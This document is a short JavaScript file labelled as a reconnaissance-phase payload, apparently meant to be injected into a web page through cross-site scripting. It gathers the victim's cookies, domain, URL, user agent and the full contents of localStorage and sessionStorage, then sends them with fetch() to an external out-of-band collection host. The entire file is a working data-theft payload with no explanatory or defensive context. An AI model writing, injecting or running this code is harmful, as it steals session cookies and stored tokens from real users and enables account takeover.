// payload.js – recon phase
fetch('https://jobu660dmzhgcqfdxxbrmpxxhonfb7zw.oastify.com/log?data=' + encodeURIComponent(
  JSON.stringify({
    cookies: document.cookie,
    domain: document.domain,
    url: location.href,
    localStorage: {...localStorage},
    sessionStorage: {...sessionStorage},
    userAgent: navigator.userAgent
  })
));
